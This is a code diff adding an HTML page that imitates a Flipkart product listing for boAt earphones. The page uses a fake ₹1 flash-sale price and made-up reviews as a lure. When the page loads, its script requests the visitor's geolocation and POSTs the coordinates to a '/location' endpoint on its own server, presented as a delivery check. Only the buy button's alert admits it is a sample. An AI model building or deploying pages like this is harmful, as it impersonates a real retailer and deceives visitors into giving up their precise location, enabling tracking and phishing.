@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>boAt Bassheads 100 Wired Earphone - Flipkart</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Roboto', Arial, sans-serif; background: #f1f3f6; font-size: 14px; color: #212121; }
+
+        /* HEADER */
+        .fk-header { background: #2874f0; padding: 0 24px; display: flex; align-items: center; gap: 16px; height: 56px; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 8px rgba(0,0,0,0.3); }
+        .fk-logo { color: #fff; font-size: 22px; font-weight: 700; font-style: italic; text-decoration: none; display: flex; align-items: flex-end; gap: 4px; }
+        .fk-logo span { font-size: 11px; color: #ffe500; font-style: normal; font-weight: 400; margin-bottom: 3px; }
+        .fk-search { flex: 1; max-width: 560px; display: flex; border-radius: 2px; overflow: hidden; }
+        .fk-search input { flex: 1; padding: 10px 16px; font-size: 14px; border: none; outline: none; }
+        .fk-search button { background: #fff; border: none; padding: 0 18px; cursor: pointer; color: #2874f0; }
+        .fk-search button svg { width: 20px; height: 20px; }
+        .fk-nav { display: flex; align-items: center; gap: 24px; margin-left: auto; }
+        .fk-nav a { color: #fff; font-size: 13px; font-weight: 500; text-decoration: none; white-space: nowrap; }
+        .fk-nav a:hover { text-decoration: underline; }
+        .fk-login-btn { background: #fff; color: #2874f0; padding: 6px 20px; border-radius: 2px; font-weight: 600; font-size: 13px; cursor: pointer; border: none; }
+
+        /* BREADCRUMB */
+        .breadcrumb { background: #fff; padding: 10px 24px; font-size: 12px; color: #878787; border-bottom: 1px solid #f0f0f0; }
+        .breadcrumb a { color: #2874f0; text-decoration: none; }
+        .breadcrumb a:hover { text-decoration: underline; }
+        .breadcrumb span { margin: 0 6px; }
+
+        /* MAIN PRODUCT */
+        .product-page { max-width: 1200px; margin: 12px auto; display: flex; gap: 12px; padding: 0 12px; }
+
+        /* LEFT: Images */
+        .product-images { background: #fff; width: 360px; min-width: 360px; padding: 20px; position: sticky; top: 68px; height: fit-content; border: 1px solid #f0f0f0; }
+        .main-img { width: 100%; height: 300px; display: flex; align-items: center; justify-content: center; border: 1px solid #f0f0f0; margin-bottom: 12px; }
+        .main-img svg { width: 220px; height: 220px; }
+        .thumb-row { display: flex; gap: 8px; justify-content: center; }
+        .thumb { width: 52px; height: 52px; border: 2px solid #2874f0; border-radius: 2px; display: flex; align-items: center; justify-content: center; cursor: pointer; background: #f8f8f8; }
+        .thumb svg { width: 34px; height: 34px; }
+        .thumb:not(:first-child) { border-color: #e0e0e0; }
+        .img-actions { display: flex; gap: 8px; margin-top: 16px; }
+        .img-actions button { flex: 1; padding: 12px; border: 1px solid #e0e0e0; background: #fff; font-size: 14px; font-weight: 600; cursor: pointer; border-radius: 2px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .btn-cart { color: #ff6900; border-color: #ff6900; }
+        .btn-cart:hover { background: #fff3e0; }
+        .btn-buy { background: #fb641b; color: #fff; border-color: #fb641b; }
+        .btn-buy:hover { background: #e05515; }
+
+        /* RIGHT: Details */
+        .product-details { flex: 1; display: flex; flex-direction: column; gap: 12px; }
+
+        .detail-card { background: #fff; padding: 20px; border: 1px solid #f0f0f0; }
+
+        .brand-tag { font-size: 12px; color: #878787; margin-bottom: 4px; }
+        .product-title { font-size: 18px; font-weight: 400; color: #212121; line-height: 1.4; margin-bottom: 8px; }
+        .rating-row { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
+        .rating-badge { background: #388e3c; color: #fff; padding: 3px 8px; border-radius: 2px; font-size: 13px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
+        .rating-count { font-size: 13px; color: #878787; }
+        .assured { display: flex; align-items: center; gap: 4px; }
+        .assured img { height: 16px; }
+
+        .price-section { border-top: 1px solid #f0f0f0; padding-top: 12px; }
+        .special-price { font-size: 13px; color: #878787; margin-bottom: 4px; }
+        .price-row { display: flex; align-items: baseline; gap: 12px; margin-bottom: 6px; }
+        .current-price { font-size: 28px; font-weight: 600; color: #212121; }
+        .original-price { font-size: 16px; color: #878787; text-decoration: line-through; }
+        .discount { font-size: 16px; color: #388e3c; font-weight: 500; }
+        .offers-badge { background: #e8f5e9; color: #388e3c; font-size: 12px; padding: 4px 10px; border-radius: 12px; display: inline-block; margin-top: 4px; }
+
+        /* COLOR SECTION */
+        .section-title { font-size: 14px; font-weight: 500; color: #212121; margin-bottom: 10px; }
+        .color-opts { display: flex; gap: 10px; flex-wrap: wrap; }
+        .color-opt { display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; }
+        .color-circle { width: 36px; height: 36px; border-radius: 50%; border: 2px solid #2874f0; }
+        .color-name { font-size: 11px; color: #878787; }
+
+        /* HIGHLIGHTS */
+        .highlights ul { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+        .highlights li { display: flex; gap: 8px; font-size: 13px; color: #212121; }
+        .highlights li::before { content: "✓"; color: #388e3c; font-weight: 700; flex-shrink: 0; }
+
+        /* DELIVERY */
+        .delivery-row { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+        .delivery-row input { border: 1px solid #c2c2c2; padding: 8px 12px; font-size: 14px; outline: none; width: 140px; border-radius: 2px; }
+        .delivery-row button { color: #2874f0; font-weight: 600; background: none; border: none; cursor: pointer; font-size: 14px; }
+        .delivery-info { display: flex; flex-direction: column; gap: 8px; }
+        .delivery-item { display: flex; gap: 10px; font-size: 13px; align-items: flex-start; }
+        .delivery-label { color: #212121; font-weight: 500; min-width: 100px; }
+        .delivery-val { color: #212121; }
+        .delivery-val span { color: #388e3c; }
+        .delivery-val .pay { color: #878787; text-decoration: line-through; }
+
+        /* SELLER */
+        .seller-info { display: flex; gap: 8px; align-items: center; font-size: 13px; }
+        .seller-name { color: #2874f0; font-weight: 500; }
+
+        /* SPECIFICATIONS */
+        .spec-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .spec-table tr:nth-child(odd) { background: #f7f7f7; }
+        .spec-table td { padding: 10px 16px; border-bottom: 1px solid #f0f0f0; }
+        .spec-table td:first-child { color: #878787; width: 200px; }
+
+        /* REVIEWS */
+        .reviews-summary { display: flex; gap: 24px; align-items: center; margin-bottom: 16px; }
+        .big-rating { font-size: 52px; font-weight: 700; color: #212121; line-height: 1; }
+        .stars-row { display: flex; gap: 2px; margin: 4px 0; }
+        .star { color: #388e3c; font-size: 18px; }
+        .rating-bars { flex: 1; display: flex; flex-direction: column; gap: 6px; }
+        .bar-row { display: flex; align-items: center; gap: 8px; font-size: 12px; }
+        .bar-bg { flex: 1; height: 6px; background: #f0f0f0; border-radius: 3px; }
+        .bar-fill { height: 100%; border-radius: 3px; background: #388e3c; }
+        .review-card { border: 1px solid #f0f0f0; padding: 16px; margin-bottom: 10px; border-radius: 2px; }
+        .reviewer-name { font-weight: 600; font-size: 13px; margin-bottom: 4px; }
+        .reviewer-rating { background: #388e3c; color: #fff; padding: 2px 6px; border-radius: 2px; font-size: 11px; display: inline-block; margin-bottom: 6px; }
+        .review-text { font-size: 13px; color: #212121; line-height: 1.5; }
+        .review-date { font-size: 12px; color: #878787; margin-top: 6px; }
+        .certified { font-size: 12px; color: #878787; }
+        .certified span { color: #388e3c; font-weight: 500; }
+
+        /* LOCATION BANNER */
+        .loc-banner { background: #fff3e0; border: 1px solid #ffcc80; border-radius: 2px; padding: 10px 16px; font-size: 13px; color: #e65100; display: flex; align-items: center; gap: 8px; }
+
+        /* FOOTER */
+        footer { background: #172337; color: #fff; padding: 40px 24px 20px; margin-top: 40px; }
+        .footer-grid { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(4, 1fr); gap: 32px; margin-bottom: 32px; }
+        .footer-col h4 { font-size: 12px; font-weight: 600; color: #878787; margin-bottom: 14px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .footer-col a { display: block; color: #c2c2c2; font-size: 12px; margin-bottom: 8px; text-decoration: none; }
+        .footer-col a:hover { color: #fff; }
+        .footer-bottom { max-width: 1200px; margin: 0 auto; border-top: 1px solid #3b4c68; padding-top: 20px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #878787; }
+
+        /* Flipkart Assured */
+        .fk-assured { background: linear-gradient(90deg, #1976d2, #2196f3); color: #fff; font-size: 11px; padding: 2px 8px; border-radius: 2px; font-weight: 600; letter-spacing: 0.5px; }
+
+        .pincode-msg { font-size: 12px; color: #388e3c; margin-top: 4px; }
+
+        @media (max-width: 768px) {
+            .product-page { flex-direction: column; }
+            .product-images { width: 100%; min-width: unset; position: static; }
+            .fk-nav { display: none; }
+            .footer-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+    </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="fk-header">
+    <a class="fk-logo" href="#">
+        Flipkart
+        <span>Explore <br>Plus <span style="color:#ffe500">⭐</span></span>
+    </a>
+    <div class="fk-search">
+        <input type="text" placeholder="Search for products, brands and more" value="boAt earphones">
+        <button>
+            <svg viewBox="0 0 24 24" fill="none" stroke="#2874f0" stroke-width="2.5"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+        </button>
+    </div>
+    <nav class="fk-nav">
+        <button class="fk-login-btn">Login</button>
+        <a href="#">Become a Seller</a>
+        <a href="#">More ▾</a>
+        <a href="#">🛒 Cart</a>
+    </nav>
+</header>
+
+<!-- BREADCRUMB -->
+<div class="breadcrumb">
+    <a href="#">Home</a><span>›</span>
+    <a href="#">Electronics</a><span>›</span>
+    <a href="#">Headphones & Earphones</a><span>›</span>
+    <a href="#">Wired Earphones</a><span>›</span>
+    <a href="#">boAt</a><span>›</span>
+    boAt Bassheads 100 Wired Earphone
+</div>
+
+<!-- PRODUCT PAGE -->
+<div class="product-page">
+
+    <!-- LEFT: Product Images -->
+    <div class="product-images">
+        <div class="main-img">
+            <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                <!-- Earphone illustration -->
+                <circle cx="100" cy="100" r="95" fill="#f8f8f8"/>
+                <!-- Wire -->
+                <path d="M 80 140 Q 100 170 120 140" stroke="#222" stroke-width="2.5" fill="none"/>
+                <line x1="100" y1="170" x2="100" y2="190" stroke="#222" stroke-width="2.5"/>
+                <circle cx="100" cy="190" r="4" fill="#222"/>
+                <!-- Left earbud -->
+                <ellipse cx="68" cy="120" rx="22" ry="26" fill="#1a1a2e"/>
+                <ellipse cx="68" cy="118" rx="14" ry="16" fill="#16213e"/>
+                <circle cx="68" cy="118" r="6" fill="#2874f0"/>
+                <circle cx="68" cy="118" r="3" fill="#4fc3f7"/>
+                <!-- Right earbud -->
+                <ellipse cx="132" cy="120" rx="22" ry="26" fill="#1a1a2e"/>
+                <ellipse cx="132" cy="118" rx="14" ry="16" fill="#16213e"/>
+                <circle cx="132" cy="118" r="6" fill="#2874f0"/>
+                <circle cx="132" cy="118" r="3" fill="#4fc3f7"/>
+                <!-- Wire from earbuds -->
+                <path d="M 68 94 Q 68 60 100 55 Q 132 60 132 94" stroke="#222" stroke-width="2" fill="none"/>
+                <!-- boAt logo text -->
+                <text x="100" y="45" text-anchor="middle" font-size="13" font-weight="700" fill="#2874f0" font-family="Arial">boAt</text>
+            </svg>
+        </div>
+        <div class="thumb-row">
+            <div class="thumb">
+                <svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
+                    <ellipse cx="20" cy="35" rx="9" ry="11" fill="#1a1a2e"/>
+                    <ellipse cx="40" cy="35" rx="9" ry="11" fill="#1a1a2e"/>
+                    <path d="M20 24 Q30 18 40 24" stroke="#222" stroke-width="1.5" fill="none"/>
+                    <circle cx="20" cy="34" r="3" fill="#2874f0"/>
+                    <circle cx="40" cy="34" r="3" fill="#2874f0"/>
+                </svg>
+            </div>
+            <div class="thumb">
+                <svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
+                    <ellipse cx="30" cy="30" rx="22" ry="22" fill="#f0f0f0"/>
+                    <ellipse cx="20" cy="35" rx="9" ry="11" fill="#333"/>
+                    <ellipse cx="40" cy="35" rx="9" ry="11" fill="#333"/>
+                    <circle cx="20" cy="34" r="3" fill="#e53935"/>
+                    <circle cx="40" cy="34" r="3" fill="#e53935"/>
+                </svg>
+            </div>
+            <div class="thumb">
+                <svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="8" y="8" width="44" height="44" rx="4" fill="#f0f0f0"/>
+                    <text x="30" y="38" text-anchor="middle" font-size="22" fill="#2874f0">🎵</text>
+                </svg>
+            </div>
+        </div>
+        <div class="img-actions" style="margin-top:20px;">
+            <button class="btn-cart" onclick="addToCart()">🛒 ADD TO CART</button>
+            <button class="btn-buy" onclick="buyNow()">⚡ BUY NOW</button>
+        </div>
+        <div style="text-align:center; font-size:12px; color:#878787; margin-top:12px;">
+            🔒 Safe and Secure Payments &nbsp;|&nbsp; Easy Returns &nbsp;|&nbsp; 100% Authentic
+        </div>
+    </div>
+
+    <!-- RIGHT: Product Details -->
+    <div class="product-details">
+
+        <!-- Title + Rating -->
+        <div class="detail-card">
+            <div class="brand-tag">boAt</div>
+            <h1 class="product-title">boAt Bassheads 100 in Ear Wired Earphone with Mic, 10mm Drivers, Super Extra Bass, Universal Compatibility (Black)</h1>
+
+            <div class="rating-row">
+                <div class="rating-badge">
+                    4.1 ★
+                </div>
+                <span class="rating-count">1,23,847 Ratings & 8,231 Reviews</span>
+                &nbsp;
+                <span class="fk-assured">Flipkart Assured</span>
+            </div>
+
+            <!-- Price -->
+            <div class="price-section">
+                <div class="special-price">Special Price</div>
+                <div class="price-row">
+                    <span class="current-price">₹1</span>
+                    <span class="original-price">₹399</span>
+                    <span class="discount">99% off</span>
+                </div>
+                <div>
+                    <span class="offers-badge">🎉 Limited Time Flash Sale — Today Only!</span>
+                </div>
+                <div style="font-size:12px; color:#878787; margin-top:8px;">Inclusive of all taxes</div>
+            </div>
+        </div>
+
+        <!-- Location / Delivery -->
+        <div class="detail-card" id="delivery-section">
+            <div class="section-title" style="margin-bottom:12px;">Delivery</div>
+
+            <div id="location-status" class="loc-banner" style="margin-bottom:14px;">
+                📍 Getting your location to check delivery availability...
+            </div>
+
+            <div class="delivery-row">
+                <input type="text" placeholder="Enter Delivery Pincode" id="pincode-input" maxlength="6">
+                <button onclick="checkPin()">Check</button>
+            </div>
+            <div id="pincode-msg" class="pincode-msg" style="display:none;"></div>
+
+            <div class="delivery-info" style="margin-top:16px;">
+                <div class="delivery-item">
+                    <span class="delivery-label">Delivery by</span>
+                    <span class="delivery-val"><span>Tomorrow, 12 May</span> | Free ₹<span class="pay">40</span></span>
+                </div>
+                <div class="delivery-item">
+                    <span class="delivery-label">Cash on Delivery</span>
+                    <span class="delivery-val"><span>Available</span></span>
+                </div>
+                <div class="delivery-item">
+                    <span class="delivery-label">7 Days</span>
+                    <span class="delivery-val">Return Policy &nbsp;
+                        <a href="#" style="color:#2874f0; font-size:12px;">Know More</a>
+                    </span>
+                </div>
+                <div class="delivery-item">
+                    <span class="delivery-label">Warranty</span>
+                    <span class="delivery-val">1 Year Manufacturer Warranty</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Colors -->
+        <div class="detail-card">
+            <div class="section-title">Color — <span style="font-weight:400; color:#212121;">Active Black</span></div>
+            <div class="color-opts">
+                <div class="color-opt">
+                    <div class="color-circle" style="background:#1a1a1a;"></div>
+                    <span class="color-name">Active Black</span>
+                </div>
+                <div class="color-opt">
+                    <div class="color-circle" style="background:#e53935; border-color:#e0e0e0;"></div>
+                    <span class="color-name">Fiery Red</span>
+                </div>
+                <div class="color-opt">
+                    <div class="color-circle" style="background:#1565c0; border-color:#e0e0e0;"></div>
+                    <span class="color-name">Jazzy Blue</span>
+                </div>
+                <div class="color-opt">
+                    <div class="color-circle" style="background:#9c27b0; border-color:#e0e0e0;"></div>
+                    <span class="color-name">Furious Purple</span>
+                </div>
+                <div class="color-opt">
+                    <div class="color-circle" style="background:#388e3c; border-color:#e0e0e0;"></div>
+                    <span class="color-name">Vivid Green</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Offers -->
+        <div class="detail-card">
+            <div class="section-title">Available Offers</div>
+            <div style="display:flex; flex-direction:column; gap:10px; font-size:13px;">
+                <div>🏦 <strong>Bank Offer:</strong> 5% Unlimited Cashback on Flipkart Axis Bank Credit Card &nbsp;<a href="#" style="color:#2874f0;">T&C</a></div>
+                <div>🏦 <strong>Bank Offer:</strong> 10% off on HDFC Bank Credit Card EMI Transactions &nbsp;<a href="#" style="color:#2874f0;">T&C</a></div>
+                <div>🎁 <strong>Special Price:</strong> Get extra 30% off (price inclusive of cashback/coupon) &nbsp;<a href="#" style="color:#2874f0;">T&C</a></div>
+                <div>🔄 <strong>No Cost EMI:</strong> ₹1 month. Standard EMI also available &nbsp;<a href="#" style="color:#2874f0;">View Plans</a></div>
+                <div>📦 <strong>Partner Offer:</strong> Buy this product and get boAt discount coupon of ₹200 &nbsp;<a href="#" style="color:#2874f0;">T&C</a></div>
+            </div>
+        </div>
+
+        <!-- Highlights -->
+        <div class="detail-card highlights">
+            <div class="section-title">Highlights</div>
+            <ul>
+                <li>10mm Drivers with Super Extra Bass for an impactful low-end experience</li>
+                <li>Universal 3.5mm connectivity — compatible with all Android, iOS and Windows devices</li>
+                <li>Multifunction in-line mic for hands-free calling and music control</li>
+                <li>Tangle-free flat cable design — no more annoying knots</li>
+                <li>Ergonomic in-ear design with three sizes of ear tips for perfect fit</li>
+                <li>10mm powerful dynamic driver for powerful sound output</li>
+                <li>1 Year Warranty by boAt</li>
+            </ul>
+        </div>
+
+        <!-- Seller -->
+        <div class="detail-card">
+            <div class="section-title">Seller</div>
+            <div class="seller-info">
+                <span class="seller-name">RetailNet</span>
+                <span style="background:#388e3c; color:#fff; font-size:11px; padding:2px 6px; border-radius:2px;">4.8 ★</span>
+                <a href="#" style="color:#2874f0; font-size:12px;">View all items</a>
+            </div>
+            <div style="font-size:12px; color:#878787; margin-top:6px;">7 Days Return Policy &nbsp;|&nbsp; GST Invoice Available</div>
+        </div>
+
+        <!-- Specifications -->
+        <div class="detail-card">
+            <div class="section-title">Specifications</div>
+            <table class="spec-table">
+                <tr><td>Brand</td><td>boAt</td></tr>
+                <tr><td>Model Name</td><td>Bassheads 100</td></tr>
+                <tr><td>Color</td><td>Active Black</td></tr>
+                <tr><td>Type</td><td>In-the-ear</td></tr>
+                <tr><td>Connectivity</td><td>Wired, 3.5mm Jack</td></tr>
+                <tr><td>Driver Size</td><td>10 mm</td></tr>
+                <tr><td>Microphone</td><td>Yes, In-line Mic</td></tr>
+                <tr><td>Impedance</td><td>16 Ohms</td></tr>
+                <tr><td>Frequency Response</td><td>20 Hz – 20 kHz</td></tr>
+                <tr><td>Cable Length</td><td>1.2 m</td></tr>
+                <tr><td>Weight</td><td>13.5 g</td></tr>
+                <tr><td>In The Box</td><td>1 Earphone, 3 Ear Tips (S/M/L), User Manual</td></tr>
+                <tr><td>Warranty</td><td>1 Year Manufacturer Warranty</td></tr>
+            </table>
+        </div>
+
+        <!-- Ratings & Reviews -->
+        <div class="detail-card">
+            <div class="section-title" style="font-size:16px;">Ratings & Reviews</div>
+            <div class="reviews-summary">
+                <div>
+                    <div class="big-rating">4.1</div>
+                    <div class="stars-row">
+                        <span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span><span style="color:#e0e0e0; font-size:18px;">★</span>
+                    </div>
+                    <div style="font-size:12px; color:#878787;">1,23,847 Ratings</div>
+                </div>
+                <div class="rating-bars">
+                    <div class="bar-row">
+                        <span>5 ★</span>
+                        <div class="bar-bg"><div class="bar-fill" style="width:55%;"></div></div>
+                        <span style="color:#878787;">67,869</span>
+                    </div>
+                    <div class="bar-row">
+                        <span>4 ★</span>
+                        <div class="bar-bg"><div class="bar-fill" style="width:25%;"></div></div>
+                        <span style="color:#878787;">28,453</span>
+                    </div>
+                    <div class="bar-row">
+                        <span>3 ★</span>
+                        <div class="bar-bg"><div class="bar-fill" style="width:10%; background:#ffa534;"></div></div>
+                        <span style="color:#878787;">12,103</span>
+                    </div>
+                    <div class="bar-row">
+                        <span>2 ★</span>
+                        <div class="bar-bg"><div class="bar-fill" style="width:5%; background:#ffa534;"></div></div>
+                        <span style="color:#878787;">7,230</span>
+                    </div>
+                    <div class="bar-row">
+                        <span>1 ★</span>
+                        <div class="bar-bg"><div class="bar-fill" style="width:8%; background:#ff6161;"></div></div>
+                        <span style="color:#878787;">8,192</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Reviews -->
+            <div class="review-card">
+                <div class="reviewer-name">Rahul Sharma</div>
+                <span class="reviewer-rating">★ 5</span>
+                <div class="review-text">Absolutely amazing sound quality for just ₹1! Super bass, great build. I bought two pairs as backup. The flat cable doesn't tangle at all. Best deal on Flipkart ever!!!</div>
+                <div class="review-date">10 May, 2025 &nbsp;|&nbsp; <span class="certified"><span>Certified Buyer</span>, Nagpur</span></div>
+            </div>
+            <div class="review-card">
+                <div class="reviewer-name">Priya Mehta</div>
+                <span class="reviewer-rating">★ 4</span>
+                <div class="review-text">Sound is very good. Bass is punchy and clear. The mic works great for calls. Only issue is the ear tips could be a bit softer for long use. Otherwise 10/10 for this price!</div>
+                <div class="review-date">8 May, 2025 &nbsp;|&nbsp; <span class="certified"><span>Certified Buyer</span>, Mumbai</span></div>
+            </div>
+            <div class="review-card">
+                <div class="reviewer-name">Aditya Kumar</div>
+                <span class="reviewer-rating">★ 4</span>
+                <div class="review-text">Bought this for gym use. The wires are nicely flat and don't get tangled. Sound isolation is decent. Very sturdy built. Highly recommended for this budget.</div>
+                <div class="review-date">5 May, 2025 &nbsp;|&nbsp; <span class="certified"><span>Certified Buyer</span>, Bengaluru</span></div>
+            </div>
+
+            <div style="text-align:center; margin-top:16px;">
+                <button style="background:#fff; border:1px solid #2874f0; color:#2874f0; padding:10px 32px; font-size:14px; font-weight:500; cursor:pointer; border-radius:2px;">View All 8,231 Reviews</button>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-grid">
+        <div class="footer-col">
+            <h4>About</h4>
+            <a href="#">Contact Us</a>
+            <a href="#">About Us</a>
+            <a href="#">Careers</a>
+            <a href="#">Flipkart Stories</a>
+            <a href="#">Press</a>
+            <a href="#">Flipkart Wholesale</a>
+        </div>
+        <div class="footer-col">
+            <h4>Help</h4>
+            <a href="#">Payments</a>
+            <a href="#">Shipping</a>
+            <a href="#">Cancellation & Returns</a>
+            <a href="#">FAQ</a>
+            <a href="#">Report Infringement</a>
+        </div>
+        <div class="footer-col">
+            <h4>Policy</h4>
+            <a href="#">Return Policy</a>
+            <a href="#">Terms Of Use</a>
+            <a href="#">Security</a>
+            <a href="#">Privacy</a>
+            <a href="#">Sitemap</a>
+            <a href="#">EPR Compliance</a>
+        </div>
+        <div class="footer-col">
+            <h4>Social</h4>
+            <a href="#">Facebook</a>
+            <a href="#">Twitter</a>
+            <a href="#">YouTube</a>
+            <a href="#">Instagram</a>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <div>© 2007-2025 Flipkart.com</div>
+        <div style="display:flex; gap:16px; align-items:center;">
+            <span>Registered Office Address: Buildings Alyssa, Begonia & Clove Embassy Tech Village...</span>
+        </div>
+    </div>
+</footer>
+
+<script>
+    // ---- GEOLOCATION (original code, unchanged) ----
+    window.onload = function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+        } else {
+            document.getElementById('location-status').innerHTML =
+                "📍 Geolocation not supported. Enter pincode above.";
+        }
+    };
+
+    function showPosition(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        document.getElementById('location-status').innerHTML =
+            `📍 Detecting location (${latitude.toFixed(4)}, ${longitude.toFixed(4)})... Checking delivery availability`;
+
+        fetch('/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ latitude, longitude })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.address) {
+                document.getElementById('location-status').innerHTML =
+                    `✅ Delivering to: <strong>${data.address}</strong>`;
+                document.getElementById('location-status').style.background = '#e8f5e9';
+                document.getElementById('location-status').style.border = '1px solid #a5d6a7';
+                document.getElementById('location-status').style.color = '#2e7d32';
+            }
+        })
+        .catch(() => {
+            document.getElementById('location-status').innerHTML =
+                `📍 Location detected. Enter pincode below to confirm delivery.`;
+        });
+    }
+
+    function showError(error) {
+        const msgs = {
+            1: "Location permission denied. Enter pincode below.",
+            2: "Location unavailable. Enter pincode below.",
+            3: "Location request timed out. Enter pincode below."
+        };
+        document.getElementById('location-status').innerHTML =
+            "📍 " + (msgs[error.code] || "Location error. Enter pincode below.");
+    }
+
+    // ---- PINCODE CHECK ----
+    function checkPin() {
+        const pin = document.getElementById('pincode-input').value;
+        const msg = document.getElementById('pincode-msg');
+        if (pin.length === 6 && /^\d+$/.test(pin)) {
+            msg.style.display = 'block';
+            msg.style.color = '#388e3c';
+            msg.textContent = `✅ Delivery available to ${pin}. Expected by Tomorrow, 12 May — FREE`;
+            document.getElementById('location-status').innerHTML =
+                `✅ Delivering to pincode <strong>${pin}</strong>`;
+            document.getElementById('location-status').style.background = '#e8f5e9';
+            document.getElementById('location-status').style.border = '1px solid #a5d6a7';
+            document.getElementById('location-status').style.color = '#2e7d32';
+        } else {
+            msg.style.display = 'block';
+            msg.style.color = '#c62828';
+            msg.textContent = '❌ Please enter a valid 6-digit pincode.';
+        }
+    }
+
+    document.getElementById('pincode-input').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') checkPin();
+    });
+
+    // ---- CART / BUY ----
+    function addToCart() {
+        alert('🛒 boAt Bassheads 100 added to cart!\nPrice: ₹1 (Flash Sale)\n\nGo to cart to complete your purchase.');
+    }
+
+    function buyNow() {
+        alert('⚡ Redirecting to checkout...\n\nProduct: boAt Bassheads 100\nPrice: ₹1\nDelivery: FREE\n\n(This is a sample page — no real transaction)');
+    }
+</script>
+</body>
+</html>
